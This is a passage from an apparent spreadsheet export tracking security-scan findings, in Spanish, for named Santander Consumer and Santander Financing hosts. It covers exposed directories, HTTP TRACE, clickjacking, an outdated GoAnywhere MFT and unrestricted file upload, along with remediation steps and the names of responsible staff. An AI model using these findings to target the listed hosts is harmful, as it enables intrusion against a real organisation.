    <x v="1"/>
    <s v="Medium"/>
    <n v="5"/>
    <m/>
    <m/>
    <s v="santanderfinancing.com"/>
    <n v="443"/>
    <m/>
    <d v="2023-12-12T00:00:00"/>
    <n v="924"/>
    <d v="2024-03-11T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="El servidor Web tiene algunos directorios listados. Se puede obtener información muy sensible de los listados de directorios."/>
    <s v="Desactivar la exploración o el listado de directorios para todos los directorios."/>
    <m/>
    <m/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="215"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="Simplefinance"/>
    <s v="QA-VM-1556165667530165409"/>
    <m/>
    <x v="3"/>
    <m/>
    <x v="2"/>
    <s v="Medium"/>
    <n v="5.8"/>
    <m/>
    <m/>
    <s v="simplefinance.santanderfinancing.com"/>
    <n v="443"/>
    <m/>
    <d v="2025-02-15T00:00:00"/>
    <n v="493"/>
    <d v="2025-05-16T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Se ha detectado un servidor Web compatible con el método HTTP TRACE. Este método permite la depuración y el análisis del rastreo de conexiones desde el cliente al servidor Web. Según la especificación HTTP, cuando se utiliza este método, el servidor Web devuelve la información enviada por el cliente sin modificar y sin filtrar. El servidor web Microsoft IIS utiliza un alias TRACK para este método, y es funcionalmente el mismo._x000a__x000a_Se ha descubierto una vulnerabilidad relacionada con este método. Un componente malicioso activo en una página Web puede enviar peticiones de Rastreo a un servidor Web que soporte este método de Rastreo. Normalmente, la seguridad del navegador impide el acceso a sitios Web fuera del dominio del sitio actual. Aunque es poco probable y difícil de lograr, es posible, en presencia de otras vulnerabilidades del navegador, que el contenido HTML activo haga peticiones externas a servidores Web arbitrarios más allá del servidor Web anfitrión. Dado que el servidor Web elegido devuelve la solicitud del cliente sin filtrar, la respuesta también incluye credenciales de autenticación basadas en cookies o en la Web (si se ha iniciado sesión) que el navegador envió automáticamente a la aplicación Web especificada en el servidor Web especificado. _x000a__x000a_La importancia de la capacidad Trace en esta vulnerabilidad es que el componente activo en la página visitada por el usuario víctima no tiene acceso directo a esta información de autenticación, sino que la obtiene después de que el servidor Web de destino se haga eco de ella como respuesta Trace._x000a_Dado que esta vulnerabilidad existe como soporte de un método requerido por la especificación del protocolo HTTP, los servidores Web más comunes son vulnerables._x000a__x000a_Los métodos exactos soportados, Trace y/o Track, y sus respuestas se encuentran en la sección Resultados más abajo._x000a__x000a_Track / Trace deben estar desactivados para cumplir con la normativa PCI."/>
    <s v="A continuación se ofrecen soluciones para algunos de los servidores Web más comunes. Para otros servidores Web, consulte la documentación de su proveedor._x000a__x000a_Apache: Las versiones recientes de Apache disponen de un módulo Rewrite que permite reescribir las peticiones HTTP o gestionarlas de una forma específica. Compile el servidor Apache con el módulo mod_rewrite. Es posible que tenga que descomentar las directivas «AddModule» y «LoadModule» en el archivo de configuración httpd.conf. Añada las siguientes líneas para cada virtualhost en su archivo de configuración (Tenga en cuenta que, por defecto, las configuraciones de reescritura no se heredan. Esto significa que necesita tener directivas Rewrite para cada host virtual en el que desee utilizarlo):_x000a__x000a_&lt;IfModule mod_rewrite.c&gt;_x000a_RewriteEngine on_x000a_RewriteCond %{REQUEST_METHOD} ^TRACE_x000a_RewriteRule .* - [F]_x000a_&lt;/IfModule&gt;_x000a__x000a_Con esta configuración, Apache captura todas las peticiones TRACE, y responde con una página informando de que la petición está prohibida. No se devuelve ningún contenido de la petición original._x000a__x000a_Una solución un poco más estricta es usar_x000a__x000a_&lt;IfModule mod_rewrite.c&gt;_x000a_RewriteEngine on_x000a_RewriteCond %{REQUEST_METHOD} !^(GET|POST|HEAD)$_x000a_RewriteRule .* - [F]_x000a_&lt;/IfModule&gt;_x000a__x000a_Tenga en cuenta que RewriteEngine puede consumir mucho procesador y puede afectar al rendimiento del servidor web. El método de rastreo también puede controlarse mediante la directiva TraceEnable._x000a_En el httpd.conf añada o modifique:_x000a__x000a_TraceEnable Off_x000a__x000a_Microsoft IIS: Microsoft ha lanzado URLScan, que puede utilizarse para filtrar todas las solicitudes entrantes basándose en reglas personalizadas. URLScan puede utilizarse para desinfectar o deshabilitar las solicitudes TRACE de los clientes. Tenga en cuenta que IIS cambia 'TRACK' por 'TRACE'. Por lo tanto, si URLScan se utiliza para bloquear específicamente el método TRACE, el método TRACK también debe añadirse al filtro._x000a__x000a_URLScan utiliza el fichero de configuración 'urlscan.ini', normalmente en el directorio \System32\InetSrv\URLScan. En él, tenemos dos secciones - AllowVerbs y DenyVerbs. La primera se usa si la variable UseAllowVerbs está a 1, de lo contrario (si está a 0), se usan las DenyVerbs. Claramente, cualquiera de los dos puede ser usado, dependiendo de si queremos una política Default-Deny-Explicit-Allow o una Default-Allow-Explicit-Deny. Para desautorizar los métodos TRACE y TRACK a través de URLScan, primero elimine los métodos 'TRACK', 'TRACE' de la sección 'AllowVerbs' y añádalos a la sección 'DenyVerbs'. Con esto, URLScan desautorizará todos los métodos 'TRACE' y 'TRACK', y generará una página de error para todas las peticiones que utilicen ese método. Para activar los cambios, reinicie el 'World Wide Web Publishing Service' desde la opción 'Servicios' del Panel de Control._x000a_Para más detalles sobre otros servidores web: Cert Advisory."/>
    <m/>
    <m/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="216"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="Simplefinance"/>
    <s v="QA-VM--441761257076188478"/>
    <m/>
    <x v="4"/>
    <m/>
    <x v="2"/>
    <s v="Medium"/>
    <n v="5.8"/>
    <m/>
    <m/>
    <s v="simplefinance.santanderfinancing.com"/>
    <n v="443"/>
    <m/>
    <d v="2025-02-15T00:00:00"/>
    <n v="493"/>
    <d v="2025-05-16T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="El servidor Web remoto admite los métodos HTTP TRACE y/o TRACK, lo que facilita a los atacantes remotos robar cookies y credenciales de autenticación o eludir el mecanismo de protección HttpOnly._x000a__x000a_Es necesario desactivar Track / Trace para cumplir con la normativa PCI."/>
    <s v="Desactive estos métodos en el archivo de configuración de su servidor web."/>
    <m/>
    <m/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="217"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <s v="QA-VM-1561738512585554183"/>
    <m/>
    <x v="3"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <n v="5.8"/>
    <m/>
    <m/>
    <s v="www.santanderfinancing.com"/>
    <n v="443"/>
    <m/>
    <d v="2025-02-15T00:00:00"/>
    <n v="493"/>
    <d v="2025-05-16T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Se ha detectado un servidor Web compatible con el método HTTP TRACE. Este método permite la depuración y el análisis del rastreo de conexiones desde el cliente al servidor Web. Según la especificación HTTP, cuando se utiliza este método, el servidor Web devuelve la información enviada por el cliente sin modificar y sin filtrar. El servidor web Microsoft IIS utiliza un alias TRACK para este método, y es funcionalmente el mismo._x000a__x000a_Se ha descubierto una vulnerabilidad relacionada con este método. Un componente malicioso activo en una página Web puede enviar peticiones de Rastreo a un servidor Web que soporte este método de Rastreo. Normalmente, la seguridad del navegador impide el acceso a sitios Web fuera del dominio del sitio actual. Aunque es poco probable y difícil de lograr, es posible, en presencia de otras vulnerabilidades del navegador, que el contenido HTML activo haga peticiones externas a servidores Web arbitrarios más allá del servidor Web anfitrión. Dado que el servidor Web elegido devuelve la solicitud del cliente sin filtrar, la respuesta también incluye credenciales de autenticación basadas en cookies o en la Web (si se ha iniciado sesión) que el navegador envió automáticamente a la aplicación Web especificada en el servidor Web especificado. _x000a__x000a_La importancia de la capacidad Trace en esta vulnerabilidad es que el componente activo en la página visitada por el usuario víctima no tiene acceso directo a esta información de autenticación, sino que la obtiene después de que el servidor Web de destino se haga eco de ella como respuesta Trace._x000a_Dado que esta vulnerabilidad existe como soporte de un método requerido por la especificación del protocolo HTTP, los servidores Web más comunes son vulnerables._x000a__x000a_Los métodos exactos soportados, Trace y/o Track, y sus respuestas se encuentran en la sección Resultados más abajo._x000a__x000a_Track / Trace deben estar desactivados para cumplir con la normativa PCI."/>
    <s v="A continuación se ofrecen soluciones para algunos de los servidores Web más comunes. Para otros servidores Web, consulte la documentación de su proveedor._x000a__x000a_Apache: Las versiones recientes de Apache disponen de un módulo Rewrite que permite reescribir las peticiones HTTP o gestionarlas de una forma específica. Compile el servidor Apache con el módulo mod_rewrite. Es posible que tenga que descomentar las directivas «AddModule» y «LoadModule» en el archivo de configuración httpd.conf. Añada las siguientes líneas para cada virtualhost en su archivo de configuración (Tenga en cuenta que, por defecto, las configuraciones de reescritura no se heredan. Esto significa que necesita tener directivas Rewrite para cada host virtual en el que desee utilizarlo):_x000a__x000a_&lt;IfModule mod_rewrite.c&gt;_x000a_RewriteEngine on_x000a_RewriteCond %{REQUEST_METHOD} ^TRACE_x000a_RewriteRule .* - [F]_x000a_&lt;/IfModule&gt;_x000a__x000a_Con esta configuración, Apache captura todas las peticiones TRACE, y responde con una página informando de que la petición está prohibida. No se devuelve ningún contenido de la petición original._x000a__x000a_Una solución un poco más estricta es usar_x000a__x000a_&lt;IfModule mod_rewrite.c&gt;_x000a_RewriteEngine on_x000a_RewriteCond %{REQUEST_METHOD} !^(GET|POST|HEAD)$_x000a_RewriteRule .* - [F]_x000a_&lt;/IfModule&gt;_x000a__x000a_Tenga en cuenta que RewriteEngine puede consumir mucho procesador y puede afectar al rendimiento del servidor web. El método de rastreo también puede controlarse mediante la directiva TraceEnable._x000a_En el httpd.conf añada o modifique:_x000a__x000a_TraceEnable Off_x000a__x000a_Microsoft IIS: Microsoft ha lanzado URLScan, que puede utilizarse para filtrar todas las solicitudes entrantes basándose en reglas personalizadas. URLScan puede utilizarse para desinfectar o deshabilitar las solicitudes TRACE de los clientes. Tenga en cuenta que IIS cambia 'TRACK' por 'TRACE'. Por lo tanto, si URLScan se utiliza para bloquear específicamente el método TRACE, el método TRACK también debe añadirse al filtro._x000a__x000a_URLScan utiliza el fichero de configuración 'urlscan.ini', normalmente en el directorio \System32\InetSrv\URLScan. En él, tenemos dos secciones - AllowVerbs y DenyVerbs. La primera se usa si la variable UseAllowVerbs está a 1, de lo contrario (si está a 0), se usan las DenyVerbs. Claramente, cualquiera de los dos puede ser usado, dependiendo de si queremos una política Default-Deny-Explicit-Allow o una Default-Allow-Explicit-Deny. Para desautorizar los métodos TRACE y TRACK a través de URLScan, primero elimine los métodos 'TRACK', 'TRACE' de la sección 'AllowVerbs' y añádalos a la sección 'DenyVerbs'. Con esto, URLScan desautorizará todos los métodos 'TRACE' y 'TRACK', y generará una página de error para todas las peticiones que utilicen ese método. Para activar los cambios, reinicie el 'World Wide Web Publishing Service' desde la opción 'Servicios' del Panel de Control._x000a_Para más detalles sobre otros servidores web: Cert Advisory."/>
    <m/>
    <m/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="218"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <s v="QA-VM-5746922802870954912"/>
    <m/>
    <x v="4"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <n v="5.8"/>
    <m/>
    <m/>
    <s v="www.santanderfinancing.com"/>
    <n v="443"/>
    <m/>
    <d v="2025-02-15T00:00:00"/>
    <n v="493"/>
    <d v="2025-05-16T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="El servidor Web remoto admite los métodos HTTP TRACE y/o TRACK, lo que facilita a los atacantes remotos robar cookies y credenciales de autenticación o eludir el mecanismo de protección HttpOnly._x000a__x000a_Es necesario desactivar Track / Trace para cumplir con la normativa PCI."/>
    <s v="Desactive estos métodos en el archivo de configuración de su servidor web."/>
    <m/>
    <m/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="219"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <s v="QA-VM--7830629651723387876"/>
    <m/>
    <x v="91"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <n v="5"/>
    <m/>
    <m/>
    <s v="www.santanderfinancing.com"/>
    <n v="443"/>
    <m/>
    <d v="2025-02-15T00:00:00"/>
    <n v="493"/>
    <d v="2025-05-16T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="El escáner encontró información sobre la versión de PHP en las cabeceras devueltas por el servidor Web de destino habilitado para PHP. Esto probablemente significa que la variable ;expose_php; está establecida en On; en el archivo de configuración php.ini; para el servidor Web."/>
    <s v="Localice el archivo de configuración php.in en el host de destino y añádale este parámetro: expose_php=Off. Reinicie el servidor Web."/>
    <m/>
    <m/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="220"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <s v="QA-VM--3482308921241785018"/>
    <m/>
    <x v="5"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <n v="5"/>
    <m/>
    <m/>
    <s v="www.santanderfinancing.com"/>
    <n v="443"/>
    <m/>
    <d v="2025-02-15T00:00:00"/>
    <n v="493"/>
    <d v="2025-05-16T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="El servidor Web tiene algunos directorios listados. Se puede obtener información muy sensible de los listados de directorios."/>
    <s v="Desactivar la exploración o el listado de directorios para todos los directorios."/>
    <m/>
    <m/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="221"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="Info"/>
    <s v="QA-WAS-aa5d4263-aadd-42ce-8dbb-0a8c3bf586fe"/>
    <m/>
    <x v="92"/>
    <m/>
    <x v="0"/>
    <s v="High"/>
    <s v="7.6"/>
    <m/>
    <m/>
    <s v="http://info.santanderconsumer.co/cgi-sys/suspendedpage.cgi"/>
    <m/>
    <m/>
    <d v="2025-02-08T00:00:00"/>
    <n v="500"/>
    <d v="2025-03-10T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Un enlace es accesible a través de una conexión insegura, es decir, HTTP."/>
    <s v="Asegúrese de que el sitio web de destino es accesible sólo a través de HTTPS._x000a_Si se reciben solicitudes que no sean HTTPS, el servidor debe redirigir la solicitud a HTTPS. También se recomienda utilizar el encabezado de respuesta Strict-Transport-Security para garantizar que los navegadores web utilicen únicamente HTTPS al realizar solicitudes al servidor."/>
    <m/>
    <m/>
    <m/>
    <s v="Sin Owner"/>
  </r>
  <r>
    <n v="222"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="Info"/>
    <s v="QA-WAS-26532864-c38a-4b71-9f53-b5bba531a906"/>
    <m/>
    <x v="93"/>
    <m/>
    <x v="0"/>
    <s v="Medium"/>
    <m/>
    <m/>
    <m/>
    <s v="https://info.santanderconsumer.co"/>
    <m/>
    <m/>
    <d v="2025-03-15T00:00:00"/>
    <n v="465"/>
    <d v="2025-06-13T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Un Certificado SSL asocia una entidad (persona, organización, host, etc.) con una Clave Pública. En una conexión SSL, el cliente autentica el servidor remoto utilizando el Certificado del servidor y extrae la Clave Pública del Certificado para establecer la conexión segura._x000a__x000a_La sección basicConstraints del certificado puede especificar si se trata de un certificado de Autoridad de Certificación (CA). Además, el campo keyUsage de la sección de extensiones X509v3 del certificado, si está presente, puede restringir el uso del certificado._x000a__x000a_En general, una clave pública de servidor no debe utilizarse para la firma de certificados o CRL, y un certificado de cliente o CA no debe utilizarse como certificado de servidor."/>
    <s v="Por favor, instale un certificado de servidor con el uso correcto."/>
    <m/>
    <m/>
    <m/>
    <s v="Sin Owner"/>
  </r>
  <r>
    <n v="223"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="Info"/>
    <s v="QA-WAS-c18209a8-6150-47e6-84f4-82c1d8f45e6b"/>
    <m/>
    <x v="2"/>
    <m/>
    <x v="0"/>
    <s v="Medium"/>
    <s v="5.8"/>
    <m/>
    <m/>
    <s v="https://info.santanderconsumer.co/cgi-sys/suspendedpage.cgi"/>
    <m/>
    <m/>
    <d v="2025-02-08T00:00:00"/>
    <n v="500"/>
    <d v="2025-05-09T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La página web puede enmarcarse. Esto significa que son posibles los ataques de clickjacking contra los usuarios."/>
    <s v="Entre los mecanismos habituales de prevención del clickjacking se incluyen:_x000a_X-Frame-Options: Se trata de una cabecera de respuesta HTTP que se utiliza para evitar el framing de la página web._x000a_Código JavaScript Framekiller: Se puede utilizar un código JS especial para impedir que un usuario malintencionado enmarque la página. Este método es menos fiable que el uso de X-Frame-Options."/>
    <m/>
    <m/>
    <m/>
    <s v="Sin Owner"/>
  </r>
  <r>
    <n v="224"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="Info"/>
    <s v="QA-WAS-86a0e551-8b79-4631-a358-368ced006411"/>
    <m/>
    <x v="2"/>
    <m/>
    <x v="0"/>
    <s v="Medium"/>
    <s v="5.8"/>
    <m/>
    <m/>
    <s v="https://info.santanderconsumer.co/cgi-sys/suspendedpage.cgi?wsidchk=10341216&amp;pdata=https%253A%252F%252Finfo.santanderconsumer.co&amp;id=7fa3b767c460b54a2be4d49030b349c7&amp;ts=1742021878"/>
    <m/>
    <m/>
    <d v="2025-03-15T00:00:00"/>
    <n v="465"/>
    <d v="2025-06-13T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La página web puede enmarcarse. Esto significa que son posibles los ataques de clickjacking contra los usuarios."/>
    <s v="Entre los mecanismos habituales de prevención del clickjacking se incluyen:_x000a_X-Frame-Options: Se trata de una cabecera de respuesta HTTP que se utiliza para evitar el framing de la página web._x000a_Código JavaScript Framekiller: Se puede utilizar un código JS especial para impedir que un usuario malintencionado enmarque la página. Este método es menos fiable que el uso de X-Frame-Options."/>
    <m/>
    <m/>
    <m/>
    <s v="Sin Owner"/>
  </r>
  <r>
    <n v="225"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Info"/>
    <s v="QA-WAS-c442b136-9edb-429a-8109-67c1ea9bc658"/>
    <m/>
    <x v="94"/>
    <m/>
    <x v="0"/>
    <s v="Medium"/>
    <s v="4.3"/>
    <m/>
    <m/>
    <s v="https://info.santanderconsumer.co/z0f76a1d14fd21a8fb5fd0d03e0fdc3d3cedae52f?wsidchk=10341216&amp;pdata=https%253A%252F%252Finfo.santanderconsumer.co&amp;id=7fa3b767c460b54a2be4d49030b349c7&amp;ts=1742021878"/>
    <m/>
    <m/>
    <d v="2025-03-15T00:00:00"/>
    <n v="465"/>
    <d v="2025-06-13T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La cookie no contiene el atributo secure."/>
    <s v="Si el riesgo asociado de una cuenta comprometida es alto, aplique el atributo secure a las cookies y obligue a que todas las solicitudes sensibles se envíen a través de HTTPS."/>
    <m/>
    <m/>
    <m/>
    <s v="Sin Owner"/>
  </r>
  <r>
    <n v="226"/>
    <s v="SF"/>
    <s v="SecurityScorecard"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="Portal de la financiera"/>
    <m/>
    <m/>
    <x v="95"/>
    <m/>
    <x v="2"/>
    <s v="Low"/>
    <m/>
    <m/>
    <m/>
    <s v="santanderconsumer.co"/>
    <m/>
    <m/>
    <d v="2024-12-02T00:00:00"/>
    <n v="568"/>
    <d v="2025-04-01T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Cuando una Autoridad de Certificación (CA) emite un certificado, incorpora dos fechas: la fecha de inicio y la fecha de finalización de su validez. Si un cliente TLS (por ejemplo, un navegador web) se conecta a un servidor TLS (por ejemplo, un sitio web) y recibe un certificado caducado, se negará a conectarse. Los certificados son activos digitales que requieren renovación o descontinuación programada._x000a__x000a_Huella dactilar SHA-256:_x000a_f669007e970e9597a1b49d5a25cc898cf138e89b4ef5399e2164bb62b50000bb_x000a__x000a_https://tools.ietf.org/html/rfc5280#section-4.1.2.5"/>
    <s v="Los servicios que presentan certificados caducados pueden causar fallos visibles, por lo que debe confirmar que el servicio sigue en uso. Si no lo está, desactívelo. De lo contrario, contacte con la CA y solicite la emisión de un nuevo certificado._x000a__x000a_Evaluar la política de gestión de certificados de la organización para garantizar que los certificados se renueven o desactiven antes de su fecha de vencimiento."/>
    <s v="Los certificados caducados impiden que los clientes TLS se conecten a los servidores."/>
    <m/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="227"/>
    <s v="SF"/>
    <s v="BitSight"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="Portal de la financiera"/>
    <m/>
    <m/>
    <x v="96"/>
    <m/>
    <x v="2"/>
    <s v="Warm"/>
    <m/>
    <m/>
    <m/>
    <s v="s2._domainkey.santanderconsumer.co"/>
    <m/>
    <m/>
    <d v="2024-05-07T00:00:00"/>
    <n v="777"/>
    <d v="2024-08-05T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="El tamaño de la clave pública es inferior a 2048 bits"/>
    <s v="Utilice la implementación de OpenSSL o SSL que prefiera para generar un nuevo par de claves y especifique una seguridad de clave de 2048 bits o superior al generarlo. Implemente el par de claves más seguro en su configuración de DKIM."/>
    <m/>
    <m/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="228"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="MFT"/>
    <s v="MAN-6847345dec176d522fbe77a2"/>
    <s v="SCO-25-CNMPO-002- VE-001"/>
    <x v="97"/>
    <m/>
    <x v="2"/>
    <s v="Medium"/>
    <s v="4.8"/>
    <m/>
    <m/>
    <s v="mft.santanderconsumer.co"/>
    <m/>
    <m/>
    <d v="2025-06-11T00:00:00"/>
    <n v="377"/>
    <d v="2025-09-09T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Se ha detectado que la aplicación utiliza una versión de GoAnywhere MFT que presenta vulnerabilidades conocidas. Sin embargo, no se ha podido detectar la versión exacta de la aplicación, con lo que no ha sido posible identificar hasta qué punto puede estar afectada. Tampoco ha sido posible llevar a cabo la explotación haciendo uso de exploits conocidos, con lo que se ha rebajado la criticidad de la vulnerabilidad."/>
    <s v="Se recomienda actualizar el producto GoAnywhere MFT a la última versión disponible (7.8.0 en el_x000a_momento de redactar este documento)."/>
    <s v="Un atacante que logre evadir las restricciones de red de la CDN tras la que se encuentra el servidor,_x000a_o que se encuentre en un segmento de red desde el que pueda acceder a todos los puertos de éste_x000a_podría explotar las vulnerabilidades presentes en el mismo."/>
    <m/>
    <m/>
    <s v="Jorge Guzman"/>
  </r>
  <r>
    <n v="229"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="MFT"/>
    <m/>
    <s v="SCO-25-CNMPO-002- CO-002"/>
    <x v="98"/>
    <m/>
    <x v="2"/>
    <s v="Low"/>
    <s v="2.6"/>
    <m/>
    <m/>
    <s v="mft.santanderconsumer.co"/>
    <m/>
    <m/>
    <d v="2025-06-11T00:00:00"/>
    <n v="377"/>
    <d v="2025-10-09T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="El aplicativo permite la subida de ficheros sin restricciones. Esta funcionalidad presenta riesgos, ya que el hecho de no limitar las subidas a ciertos tipos de ficheros esperados (como documentos de texto, de Office, etcétera) puede  ermitir la subida y la distribución de contenido malicioso a través del servidor."/>
    <s v="Se recomienda configurar el servidor para aceptar únicamente extensiones de fichero conocidas._x000a_Se recomienda también implementar un sistema de detección de contenido malicioso para denegar la subida de ficheros que puedan contener malware."/>
    <s v="Un atacante podría hacer uso del servidor para almacenar malware y después distribuirlo a otros_x000a_usuarios, aprovechando que la aplicación se trata de una fuente de confianza al pertenecer al Grupo_x000a_Santander."/>
    <m/>
    <m/>
    <s v="Jorge Guzman"/>
  </r>
  <r>
    <n v="230"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Experiencia"/>
    <s v="QA-WAS-71ed93e2-1412-4e6f-b0cb-27771ad0e22e"/>
    <m/>
    <x v="99"/>
    <m/>
    <x v="2"/>
    <s v="Medium"/>
    <s v="5.3"/>
    <m/>
    <m/>
    <s v="https://experiencia.santanderconsumer.co/hs/hsstatic/content-cwv-embed/squidGuard.conf"/>
    <m/>
    <m/>
    <d v="2025-06-21T00:00:00"/>
    <n v="367"/>
    <d v="2025-09-19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m/>
    <m/>
    <s v="Validar"/>
  </r>
  <r>
    <n v="231"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Experiencia"/>
    <s v="QA-WAS-2e6073e3-e7c2-45c2-98bb-252290d69100"/>
    <m/>
    <x v="99"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <s v="5.3"/>
    <m/>
    <m/>
    <s v="https://experiencia.santanderconsumer.co/hs/hsstatic/content-cwv-embed/static-1.1293/squidGuard.conf"/>
    <m/>
    <m/>
    <d v="2025-06-21T00:00:00"/>
    <n v="367"/>
    <d v="2025-09-19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m/>
    <m/>
    <s v="Validar"/>
  </r>
  <r>
    <n v="232"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Experiencia"/>
    <s v="QA-WAS-423d6b06-55f2-405e-9338-066f7c14ed6b"/>
    <m/>
    <x v="99"/>
    <m/>
    <x v="2"/>
    <s v="Medium"/>
    <s v="5.3"/>
    <m/>
    <m/>
    <s v="https://experiencia.santanderconsumer.co/hs/hsstatic/content-cwv-embed/static-1.1293/squidGuard.conf.template"/>
    <m/>
    <m/>
    <d v="2025-06-21T00:00:00"/>
    <n v="367"/>
    <d v="2025-09-19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m/>
    <m/>
    <s v="Validar"/>
  </r>
  <r>
    <n v="233"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <s v="QA-WAS-25aebb6b-433e-411a-b7ba-380d179d1bab"/>
    <m/>
    <x v="83"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <s v="5.3"/>
    <m/>
    <m/>
    <s v="https://santanderfinancing.com/wp-content/et-cache/6086/"/>
    <m/>
    <m/>
    <d v="2025-06-21T00:00:00"/>
    <n v="367"/>
    <d v="2025-09-19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enny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="234"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <s v="QA-WAS-5231fdc8-8f2b-45f5-9648-b99d334921d2"/>
    <m/>
    <x v="83"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <s v="5.3"/>
    <m/>
    <m/>
    <s v="https://santanderfinancing.com/wp-content/plugins/dg-divi-carousel.old/"/>
    <m/>
    <m/>
    <d v="2025-06-21T00:00:00"/>
    <n v="367"/>
    <d v="2025-09-19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enny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="235"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <s v="QA-WAS-8a52b3f9-e09f-4896-a4e3-6aa0105046de"/>
    <m/>
    <x v="83"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <s v="5.3"/>
    <m/>
    <m/>
    <s v="https://santanderfinancing.com/wp-content/plugins/dg-divi-carousel.old/scripts/"/>
    <m/>
    <m/>
    <d v="2025-06-21T00:00:00"/>
    <n v="367"/>
    <d v="2025-09-19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enny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="236"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <s v="QA-WAS-21fe3aa3-f392-4a65-b7c8-d813643f6005"/>
    <m/>
    <x v="83"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <s v="5.3"/>
    <m/>
    <m/>
    <s v="https://santanderfinancing.com/wp-content/plugins/dg-divi-carousel.old/styles/"/>
    <m/>
    <m/>
    <d v="2025-06-21T00:00:00"/>
    <n v="367"/>
    <d v="2025-09-19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enny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="237"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
